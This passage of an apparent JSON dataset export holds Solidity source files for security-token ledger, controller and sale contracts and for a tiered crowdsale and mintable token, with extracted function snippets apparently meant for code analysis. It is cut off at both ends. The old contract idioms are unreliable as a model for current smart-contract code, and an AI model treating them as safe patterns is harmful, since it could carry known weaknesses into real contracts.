(bool success) {\n return ledger.approve(_owner, _spender, _value);\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {\n return ledger.increaseApproval(_owner, _spender, _addedValue);\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {\n return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\n }\n function burn(address _owner, uint _amount) public onlyToken {\n ledger.burn(_owner, _amount);\n }\n}\ninterface ISecurityLedger {\n function balanceOf(address _a) external view returns (uint);\n function totalSupply() external view returns (uint);\n function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint);\n function approve(address _owner, address _spender, uint _value) external returns (bool success);\n function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);\n function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);\n function burn(address _owner, uint _amount) external;\n function setController(address _controller) external;\n}\ncontract SecurityLedger is Ownable {\n using SafeMath for uint256;\n struct TokenLot {\n uint amount;\n uint purchaseDate;\n bool restricted;\n }\n mapping(address => TokenLot[]) public tokenLotsOf;\n SecurityController public controller;\n mapping(address => uint) public balanceOf;\n mapping (address => mapping (address => uint)) public allowance;\n uint public totalSupply;\n uint public mintingNonce;\n bool public mintingStopped;\n constructor() public {\n }\n function setController(address _controller) public onlyOwner {\n controller = SecurityController(_controller);\n }\n function stopMinting() public onlyOwner {\n mintingStopped = true;\n }\n function mint(address addr, uint value, uint timestamp) public onlyOwner {\n require(!mintingStopped);\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n totalSupply = totalSupply.add(value);\n }\n function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\n require(!mintingStopped);\n if (nonce != mintingNonce) return;\n mintingNonce = mintingNonce.add(1);\n uint256 lomask = (1 << 96) - 1;\n uint created = 0;\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n for (uint i = 0; i < bits.length; i++) {\n address addr = address(bits[i]>>96);\n uint value = bits[i] & lomask;\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n created = created.add(value);\n }\n totalSupply = totalSupply.add(created);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n modifier onlyController() {\n require(msg.sender == address(controller));\n _;\n }\n function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,\n bool newTokensAreRestricted, bool preservePurchaseDate)\n internal returns (uint numTransferrableTokens)\n {\n TokenLot[] storage fromTokenLots = tokenLotsOf[from];\n for(uint i=0; i<fromTokenLots.length; i++) {\n TokenLot storage lot = fromTokenLots[i];\n uint lotAmount = lot.amount;\n if(lotAmount == 0) {\n continue;\n }\n if(lockoutTime > 0) {\n if(lot.restricted && lot.purchaseDate > lockoutTime) {\n continue;\n }\n }\n uint remaining = amount - numTransferrableTokens;\n if(lotAmount >= remaining) {\n numTransferrableTokens = numTransferrableTokens.add(remaining);\n if(removeTokens) {\n lot.amount = lotAmount.sub(remaining);\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n break;\n }\n numTransferrableTokens = numTransferrableTokens.add(lotAmount);\n if(removeTokens) {\n lot.amount = 0;\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n }\n }\n function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {\n return walkTokenLots(from, to, amount, lockoutTime, false, false, false);\n }\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n return true;\n }\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint allowed = allowance[_from][_spender];\n if (allowed < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n allowance[_from][_spender] = allowed.sub(_value);\n return true;\n }\n function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {\n if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\n return false;\n }\n allowance[_owner][_spender] = _value;\n return true;\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n allowance[_owner][_spender] = oldValue.add(_addedValue);\n return true;\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n if (_subtractedValue > oldValue) {\n allowance[_owner][_spender] = 0;\n } else {\n allowance[_owner][_spender] = oldValue.sub(_subtractedValue);\n }\n return true;\n }\n function burn(address _owner, uint _amount) public onlyController {\n require(balanceOf[_owner] >= _amount);\n balanceOf[_owner] = balanceOf[_owner].sub(_amount);\n walkTokenLots(_owner, address(0), _amount, 0, true, false, false);\n totalSupply = totalSupply.sub(_amount);\n }\n}\ninterface ISecuritySale {\n function setLive(bool newLiveness) external;\n function setInvestorList(address _investorList) external;\n}\ncontract SecuritySale is Ownable {\n bool public live;\n IInvestorList public investorList;\n event SaleLive(bool liveness);\n event EtherIn(address from, uint amount);\n event StartSale();\n event EndSale();\n constructor() public {\n live = false;\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function () public payable {\n require(live);\n require(investorList.inList(msg.sender));\n emit EtherIn(msg.sender, msg.value);\n }\n function setLive(bool newLiveness) public onlyOwner {\n if(live && !newLiveness) {\n live = false;\n emit EndSale();\n }\n else if(!live && newLiveness) {\n live = true;\n emit StartSale();\n }\n }\n function withdraw() public onlyOwner {\n msg.sender.transfer(address(this).balance);\n }\n function withdrawSome(uint value) public onlyOwner {\n require(value <= address(this).balance);\n msg.sender.transfer(value);\n }\n function withdrawTokens(address token) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(msg.sender, t.balanceOf(this)));\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n}\ninterface ISecurityToken {\n function balanceOf(address addr) external view returns(uint);\n function transfer(address to, uint amount) external returns(bool);\n function controllerTransfer(address _from, address _to, uint _value) external;\n}\ncontract SecurityToken is Ownable{\n using SafeMath for uint256;\n ISecurityController public controller;\n string public name;\n string public symbol;\n uint8 public decimals;\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function setController(address _c) public onlyOwner {\n controller = ISecurityController(_c);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n function balanceOf(address a) public view returns (uint) {\n return controller.balanceOf(a);\n }\n function totalSupply() public view returns (uint) {\n return controller.totalSupply();\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return controller.allowance(_owner, _spender);\n }\n function burn(uint _amount) public {\n controller.burn(msg.sender, _amount);\n emit Transfer(msg.sender, 0x0, _amount);\n }\n modifier onlyPayloadSize(uint numwords) {\n assert(msg.data.length >= numwords.mul(32).add(4));\n _;\n }\n function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {\n return controller.isTransferAuthorized(_from, _to);\n }\n function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {\n if (controller.transfer(msg.sender, _to, _value)) {\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {\n if (controller.transferFrom(msg.sender, _from, _to, _value)) {\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {\n if (controller.approve(msg.sender, _spender, _value)) {\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n modifier onlyController() {\n assert(msg.sender == address(controller));\n _;\n }\n function controllerTransfer(address _from, address _to, uint _value) public onlyController {\n emit Transfer(_from, _to, _value);\n }\n function controllerApprove(address _owner, address _spender, uint _value) public onlyController {\n emit Approval(_owner, _spender, _value);\n }\n}\ninterface ITransferAuthorizations {\n function setController(address _controller) external;\n function get(address from, address to) external view returns (uint);\n function set(address from, address to, uint expiry) external;\n}\ncontract TransferAuthorizations is Ownable, ITransferAuthorizations {\n mapping(address => mapping(address => uint)) public authorizations;\n address public controller;\n event TransferAuthorizationSet(address from, address to, uint expiry);\n function setController(address _controller) public onlyOwner {\n controller = _controller;\n }\n modifier onlyController() {\n assert(msg.sender == controller);\n _;\n }\n function set(address from, address to, uint expiry) public onlyController {\n require(from != 0);\n authorizations[from][to] = expiry;\n emit TransferAuthorizationSet(from, to, expiry);\n }\n function get(address from, address to) public view returns (uint) {\n return authorizations[from][to];\n }\n}",
  "extract_feature": [
    "function setTransferAuthorized(address from, address to, uint expiry) public {\nrequire(transferAuthPermission[msg.sender]);\nrequire(from != 0);\nif(expiry > 0) {\nrequire(expiry > block.timestamp);\nrequire(expiry <= (block.timestamp + 30 days));\n}\ntransferAuthorizations.set(from, to, expiry);\n}",
    "function isTransferAuthorized(address _from, address _to) public view returns (bool) {\nuint expiry = transferAuthorizations.get(_from, _to);\nuint globalExpiry = transferAuthorizations.get(_from, 0);\nif(globalExpiry > expiry) {\nexpiry = globalExpiry;\n}\nreturn expiry > block.timestamp;\n}",
    "function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function mint(address addr, uint value, uint timestamp) public onlyOwner {\nrequire(!mintingStopped);\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ntotalSupply = totalSupply.add(value);\n}",
    "function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\nrequire(!mintingStopped);\nif (nonce != mintingNonce) return;\nmintingNonce = mintingNonce.add(1);\nuint256 lomask = (1 << 96) - 1;\nuint created = 0;\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nfor (uint i = 0; i < bits.length; i++) {\naddress addr = address(bits[i]>>96);\nuint value = bits[i] & lomask;\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ncreated = created.add(value);\n}\ntotalSupply = totalSupply.add(created);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa4"
  },
  "filename": "9892.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = 